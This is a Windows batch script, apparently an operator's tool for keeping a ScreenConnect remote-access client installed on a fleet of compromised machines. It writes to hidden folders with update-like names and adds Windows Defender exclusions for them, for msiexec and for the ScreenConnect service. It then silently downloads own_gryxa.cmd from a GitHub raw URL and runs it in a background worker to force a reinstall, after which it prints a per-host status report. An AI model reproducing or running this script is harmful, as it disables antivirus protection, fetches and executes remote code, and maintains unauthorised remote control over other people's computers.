@echo off
rem OWN_GRYXA_FORCE BUILD 20260804F4 - fleet REINSTALL + REPORT (sevrz 10s safe)
rem F4: always queue own_gryxa REINSTALL (panel wipe). Never skip-alive.
rem F3: NO pipe chars in any echo.
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\own_gryxa_force.log"
set "PIN=455d4b9"
set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%"
set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "WORKER=%STAGE%\gryxa_force_worker.cmd"
set "BUILD=F4"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] force_begin build=%BUILD% host=%COMPUTERNAME%>>"%LOG%"

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1

if not exist "%WD%\own_gryxa.cmd" (
  echo BUILD=%BUILD%
  echo HOST=%COMPUTERNAME%
  echo HEALTH=FAIL
  echo REASON=no-own_gryxa
  echo REPORT %COMPUTERNAME% %FP% FAIL no-own_gryxa
  endlocal & exit /b 2
)

set "PRE=ABSENT"
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (set "PRE=ALIVE") else (set "PRE=STOPPED")
)

rem clear stale lock so REINSTALL is not skipped
if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1

> "%WORKER%" (
  echo @echo off
  echo echo [%DATE% %TIME%] worker_reinstall_begin^>^>"%LOG%"
  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL ^>^>"%LOG%" 2^>^&1
  echo echo [%DATE% %TIME%] worker_reinstall_done^>^>"%LOG%"
)
start "" /b cmd /c call "%WORKER%"
set "ACTION=queued-reinstall"
echo [%DATE% %TIME%] queued REINSTALL worker pre=%PRE%>>"%LOG%"

set "STATE=ABSENT"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "STATE=ABSENT"
) else (
  sc query "%SVC%" | findstr /I /C:"RUNNING" >nul && set "STATE=RUNNING"
  if /I not "!STATE!"=="RUNNING" sc query "%SVC%" | findstr /I /C:"START_PENDING" >nul && set "STATE=START_PENDING"
  if /I not "!STATE!"=="RUNNING" if /I not "!STATE!"=="START_PENDING" sc query "%SVC%" | findstr /I /C:"STOPPED" >nul && set "STATE=STOPPED"
)

set "HEALTH=QUEUED"
set "DIR=0"
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%FP%)" set "DIR=1"
if exist "%ProgramFiles%\ScreenConnect Client (%FP%)" set "DIR=1"

echo.
echo ====== GRYXA REPORT ======
echo BUILD=%BUILD%
echo HOST=%COMPUTERNAME%
echo FP=%FP%
echo PRE=%PRE%
echo STATE=!STATE!
echo HEALTH=!HEALTH!
echo DIR=!DIR!
echo ACTION=!ACTION!
echo REPORT %COMPUTERNAME% %FP% !HEALTH! state=!STATE! dir=!DIR! pre=%PRE% action=!ACTION!
echo ==========================
echo [%DATE% %TIME%] REPORT HEALTH=!HEALTH! STATE=!STATE! ACTION=!ACTION!>>"%LOG%"
endlocal & exit /b 0
